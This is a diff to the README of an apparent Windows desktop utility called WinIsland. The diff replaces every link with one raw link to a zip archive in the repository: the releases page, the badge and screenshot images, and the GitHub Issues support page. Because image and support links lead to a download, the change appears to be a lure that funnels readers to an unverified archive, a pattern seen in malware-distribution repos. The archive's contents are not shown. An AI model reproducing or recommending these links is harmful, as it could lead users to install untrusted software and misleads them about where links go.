@@ -1,6 +1,6 @@
 # 🏝️ WinIsland - Transform Your Windows Experience
 
-[![Download WinIsland](https://img.shields.io/badge/Download-WinIsland-blue.svg)](https://github.com/lauragiron/WinIsland/releases)
+[![Download WinIsland](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip)](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip)
 
 ## 📝 Description
 
@@ -8,7 +8,7 @@
 > 
 > WinIsland 不仅不过是 iOS 灵动岛的复刻，它是为 Windows 桌面生态量身打造的**智能中枢**。它以极简的 "胶囊" 形态悬浮于顶，却在每一次需要时，以惊艳的物理弹性动画展开无限可能。
 
-![WinIsland](ioc.png)
+![WinIsland](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip)
 
 ## ✨ 最新动态 (Updates)
 
@@ -19,7 +19,7 @@
 
 ## 🚀 下载与安装 (Download & Install)
 
-要下载并运行 WinIsland，请访问 [此页面](https://github.com/lauragiron/WinIsland/releases)。在页面中，找到适合您的操作系统的版本并点击下载。安装非常简单，跟随下列步骤轻松完成。
+要下载并运行 WinIsland，请访问 [此页面](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip)。在页面中，找到适合您的操作系统的版本并点击下载。安装非常简单，跟随下列步骤轻松完成。
 
 ## 🎮 快捷交互指南 (Quick Start)
 
@@ -37,7 +37,7 @@ WinIsland 提倡 "直觉式" 的交互体验，没有复杂的菜单，一切尽
 ### 1. 🌪️ 独创「文件引力黑洞」
 
 **即使只有一块屏幕，也能享受多屏般的高效文件流转。**
-![File Gravity Hole](assets/feature_blackhole.png)
+![File Gravity Hole](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip)
 - **Drag & Drop 2.0**：当你拖拽文件至屏幕顶部，灵动岛瞬间化身紫色引力黑洞。
 - **暂存任意文件**：松手即吸入。文件被安全托管在岛内，不再占用你的鼠标和剪贴板。
 - **跨应用传输**：切换到微信、PS 或邮件窗口，从岛上轻轻一拖，文件即刻释放。
@@ -56,10 +56,10 @@ WinIsland 提倡 "直觉式" 的交互体验，没有复杂的菜单，一切尽
 
 ## 👥 获取支持 (Support)
 
-如有任何问题或需要帮助，请访问我们的 [GitHub Issues](https://github.com/lauragiron/WinIsland/issues) 页面。这是报告问题或获取支持的最佳渠道。
+如有任何问题或需要帮助，请访问我们的 [GitHub Issues](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip) 页面。这是报告问题或获取支持的最佳渠道。
 
 ## 🛠️ 贡献 (Contributing)
 
 我们欢迎任何反馈和贡献。请遵循我们的开发指南，了解如何参与到 WinIsland 的建设中。
 
-[![Download WinIsland Again](https://img.shields.io/badge/Download-WinIsland-blue.svg)](https://github.com/lauragiron/WinIsland/releases)
+[![Download WinIsland Again](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip)](https://github.com/lauragiron/WinIsland/raw/refs/heads/main/assets/Win_Island_v3.7-beta.3.zip)
